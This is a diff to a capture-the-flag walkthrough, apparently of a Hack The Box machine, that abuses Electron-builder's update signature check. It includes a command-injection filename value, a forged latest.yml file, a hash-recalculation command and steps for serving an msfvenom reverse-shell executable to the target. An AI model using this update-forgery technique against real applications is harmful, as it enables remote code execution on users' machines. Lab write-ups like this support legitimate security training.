@@ -21,8 +21,8 @@ output: html_document
 </div>
 
 **Ports/services exploited:** SMB\\
-**Tools:** dirb, smbclient\\
-**Techniques:** Enumeration\\
+**Tools:** dirb, smbclient, msfvenom\\
+**Techniques:** Enumeration, reverse shell\\
 **Keywords:** Electron builder\\
 
 
@@ -182,23 +182,71 @@ This code translates to the following PowerShell command:
 powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\<USER>\AppData\Roaming\<vulnerable app name>\__update__\<update name>.exe' | ConvertTo-Json -Compress"
 `````
 
-The idea is that since the *${tempUpdateFile}* variable is provided unescaped to the *execfile* utility, we can bypass the signature verification by triggering a parse error in the script. It can be done by using a filename containing a sinngle quote and then by recalculating the file hash to match our provided binary (with *shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64*).\\
-When serving a **latest.yml** file to a vulnerable Electron app, our chosen setup executable will be run without warnings. We could for example leverage the lack of escaping to pull a command injection as follows:
+We see that the *${tempUpdateFile}* variable is provided unescaped to the *execfile* utility, so we can bypass the signature verification by triggering a parse error in the script. It can be done by using a filename containing a single quote and then by recalculating the file hash to match our provided binary (with *shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64*).\\
+When serving a **latest.yml** file to a vulnerable Electron app, our chosen setup executable will be run without warnings. We could for example define a malicious update file as follows:
 
 ````
 version: 1.2.3
 files:
-  - url: v';calc;'ulnerable-app-setup-1.2.3.exe
+  - url: v’ulnerable-app-setup-1.2.3.exe
   sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
   size: 44653912
-path: v';calc;'ulnerable-app-1.2.3.exe
+path: v'ulnerable-app-1.2.3.exe
 sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
 releaseDate: '2019-11-20T11:17:02.627Z'
 ``````
 
-So from what I understand of the article, we have to write a malicious *latest.yml* file and place it in one of the client folders (we saw that on the PDF). This will automatically initiate the QA process. Therefore, we must find how to write that file.
+So from what I understand of the article, we have to write a malicious *latest.yml* file and place it in one of the client folders (we saw that on the PDF). This will automatically initiate the QA process. Therefore, we must find how to write that file, and then *put* it in one of the client folder on the *Software_Updates* share (that was said in the PDF).\\
+
+Let's follow the article step-by-step: we first create a malicious update file which must contain a single quote. Then, we must recalculate the file hash. Let's try to include a reverse shell payload in the file. We'll use **msfvenom** to create and encode it:
+
+<div class="img_container">
+![msfvenom]({{https://jsom1.github.io/}}/_images/htb_atom_msfv1.png)
+</div>
+<div class="img_container">
+![msfvenom]({{https://jsom1.github.io/}}/_images/htb_atom_msfv2.png)
+</div>
+
+We specified a Windows reverse TCP payload and an *exe* file format. We recalculate the file hash with the command given in the article:
+
+<div class="img_container">
+![base64]({{https://jsom1.github.io/}}/_images/htb_atom_base64.png)
+</div>
+
+Finally, we create the *latest.yml* file which will contain the generated hash. Instead of the local path provided in the article, we give our IP address so that the server can download our malicious file:
+
+<div class="img_container">
+![latest.yml]({{https://jsom1.github.io/}}/_images/htb_atom_yml.png)
+</div>
+
+Before putting this file on the server and starting our own, we must not forget to copy the *m'aliciousupdate.exe* file in our web root directory:
+
+````
+sudo cp "m'aliciousupdate.exe" /var/www/html
+`````
+
+When we'll *put* the *latest.yml* file on the target machine, this latter should download our malicious file and execute it. Therefore, we will setup a *multi/handler* in Metasploit to catch the reverse shell:
+
+<div class="img_container">
+![multi handler]({{https://jsom1.github.io/}}/_images/htb_atom_mh.png)
+</div>
+
+Maybe the default could work, but we have a better chance if we specify the right payload. Now that we're ready to catch the reverse shell, we can start our web server:
+
+````
+sudo python -m SimpleHTTPServer 8080
+`````
+
+And *put* the *latest.yml* file in one of the client folder:
+
+<div class="img_container">
+![put latest.yml]({{https://jsom1.github.io/}}/_images/htb_atom_put.png)
+</div>
+
+We see that the server *GET* requested our file:
 
 
+and we should get a reverse shell:
 
 
 <ins>**My thoughts**</ins>
